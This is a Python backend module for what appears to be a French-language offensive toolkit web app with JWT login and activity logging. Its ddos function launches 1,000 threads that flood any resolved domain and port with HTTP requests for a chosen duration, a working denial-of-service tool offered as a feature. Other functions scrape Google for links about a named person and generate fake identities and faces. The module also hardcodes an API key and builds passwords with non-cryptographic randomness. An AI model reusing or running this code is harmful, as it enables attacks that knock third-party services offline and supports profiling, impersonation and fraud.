import random
import string
from bs4 import BeautifulSoup
import jwt
from datetime import datetime
import datetime as date_time

import urllib.parse
from config.config import secret_key
import sqlite3
from utils.utils import hash_password, check_password
from faker import Faker
import socket
import threading
import dns.resolver
import time
import requests

def password_exist(json_data, current_user):
    with open("./documents/passwords.txt", 'r', encoding='utf-8') as file:
        passwords = {line.strip() for line in file}
      
        add_log(current_user['id'], "Test de la vulnérabilité d'un mot de passe")

        if json_data['password'] in passwords:
            return {"output": {"message": "Password match"}, "status": 200}
        
        return {"output": {"message": "Password doesn\'t match"}, "status": 200}
        
def generate_stronger_password(json_data, current_user):
    length = int(json_data['length'])
    
    uppercase = random.choice(string.ascii_uppercase)
    digit = random.choice(string.digits)
    special_char = random.choice(string.punctuation)

    other_characters = random.choices(string.ascii_letters + string.digits + string.punctuation, k=length-3)
    password_list = list(uppercase + digit + special_char + ''.join(other_characters))
    random.shuffle(password_list)

    password = ''.join(password_list)

    add_log(current_user['id'], "Génération d'un mot de passe sécurisé")

    return {"output": {"message": password}, "status": 201}

def fake_identity(current_user):
    fake = Faker()

    fake_identity = {
        'name': fake.name(),
        'address': fake.address(),
        'email': fake.email(),
        'birthdate': fake.date_of_birth().isoformat()
    }

    add_log(current_user['id'], "Génération d'une fausse identité")

    return {"output": fake_identity, "status": 201}

def attack(target_ip, fake_ip, port, stop_event):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))

            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))

            s.close()

        except socket.error as e:
            print(f"Request error : {e}")
            break

def ddos(json_data, current_user):
    try :
        domain_name = json_data["domain_name"]
        port = json_data["port"]
        time_execution = json_data["time_execution"]

        dns_checkup = dns.resolver.resolve(domain_name, 'A')

        target_ip = ""
        fake_ip = "185.24.12.17"
        threads = 1000

        for ip in dns_checkup:
            target_ip = str(ip)

        if target_ip != "":
            stop_event = threading.Event()

            thread_list = []
            for i in range(threads):
                thread = threading.Thread(target=attack, args=(target_ip, fake_ip, port, stop_event))
                thread_list.append(thread)
                thread.start()

            time.sleep(time_execution)

            stop_event.set()

            for thread in thread_list:
                thread.join()

            add_log(current_user['id'], f"DDOS : {domain_name} / PORT : {port} / DURÉE : {time_execution} seconde(s)")

            return {"output": {"message": f"Attack successfull, duration : {time_execution} second(s)"}, "status": 200}
    except Exception as e:
        return {"output": {"message": "Fail"}, "status": 400}

def login(json_data):
    username = json_data["username"]
    password = json_data["password"]
 
    with sqlite3.connect('db.sqlite') as conn:
        cursor = conn.cursor()

        cursor.execute('SELECT id, password, authority FROM users WHERE username = ?', (username,))
        user = cursor.fetchone()

        if user is not None and check_password(user[1], password):
            token = jwt.encode({
                'id': user[0],
                'username': username,
                'authority': user[2],
                'exp': date_time.datetime.utcnow() + date_time.timedelta(hours=24)
            }, secret_key, algorithm="HS256")
        
            return {"output": {"message": token}, "status": 200}      

        return {"output": {"message": "Incorrect credentials"}, "status": 401}                      
     
def user_add(json_data, current_user):
    username = json_data["username"]
    password = json_data["password"]
    authority = json_data["authority"]
    creation_date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if authority != "user" and authority != "admin":
        return {"output": {"message": "You need to specify valid authority : (user, admin)"}, "status": 400}

    try:
        with sqlite3.connect('db.sqlite') as conn:
            cursor = conn.cursor()
            
            cursor.execute('INSERT INTO users (username, password, authority, creation_date) VALUES (?, ?, ?, ?)', (username, hash_password(password), authority, creation_date))
            conn.commit()            

        user_data = {
            'id': cursor.lastrowid,
            'username': username,
            'authority': authority,
            'creation_date': creation_date
        } 

        add_log(current_user['id'], "Création de l'utilisateur : " + username)

        return {"output": user_data, "status": 201}     
    
    except sqlite3.IntegrityError as e:
        return {"output": {"message": "Username already exist"}, "status": 409}

def get_users(current_user):
    with sqlite3.connect('db.sqlite') as conn:
        cursor = conn.cursor()

        cursor.execute('SELECT id, username, creation_date, authority FROM users ORDER BY id ASC')
        users = cursor.fetchall()

        users_list = []
        for user in users:
            user_data = {
                'id': user[0],
                'username': user[1],
                'authority': user[3],
                'creation_date': user[2]
            }
            users_list.append(user_data)

        add_log(current_user['id'], "Consultation des utilisateurs")

        return {"output": users_list, "status": 200}
    
def add_log(user_id, description):
    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    with sqlite3.connect('db.sqlite') as conn:
        cursor = conn.cursor()

        cursor.execute('INSERT INTO logs (date, description, user_id) VALUES (?, ?, ?)', (date, description, user_id))
        conn.commit()

def get_logs(current_user):
    with sqlite3.connect('db.sqlite') as conn:
        cursor = conn.cursor()

        cursor.execute('SELECT logs.id, users.username, logs.date, logs.description FROM logs JOIN users ON logs.user_id = users.id ORDER BY logs.date DESC')
        logs = cursor.fetchall()

        logs_list = []
        for log in logs:
            log_data = {
                'id': log[0],
                'date': log[2],
                'username': log[1],
                'description': log[3]                
            }
            logs_list.append(log_data)

        add_log(current_user['id'], "Consultation des logs")

        return {"output": logs_list, "status": 200}
    
def random_face(current_user):
    try :
        url = "https://randomuser.me/api/"

        response = requests.get(url)

        user_data = response.json()

        image_url = user_data['results'][0]['picture']['large']

        add_log(current_user['id'], "Génération d'un faux visage")

        return {"output": {"message": image_url}, "status": 201}
    except:
        return {"output": {"message": "Error generate random face"}, "status": 500}
    
def crawler(json_data, current_user):
    try :
        firstname = json_data["firstname"]
        lastname = json_data["lastname"]

        url = f"https://www.google.com/search?q={firstname + lastname}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            results = soup.find_all('a', href=True)
            
            urls = [result['href'] for result in results if result['href'].startswith('http')]   

            add_log(current_user['id'], "Recherche d'informations sur un utilisateur")

            return {"output": urls, "status": 200}
    except Exception as e:
        print(e)

def isValidEmail(json_data, current_user):
    email = json_data["email"]

    response = requests.get(f"https://emailvalidation.abstractapi.com/v1/?api_key=e54340b071784b5cb220d24c27515de7&email={email}&auto_correct=false")
    
    if response.status_code == 200:
        data = response.json()
        is_valid = data["is_valid_format"]["value"] and data["deliverability"] == "DELIVERABLE"
        
        add_log(current_user['id'], "Vérifier la validité d'une adresse mail")

        if is_valid:
            return {"output": {"message": "Email is valid"}, "status": 200}
        else:
            return {"output": {"message": "Email is invalid"}, "status": 404}
    else:
        return {"output": {"message": "Fail to research email"}, "status": 500}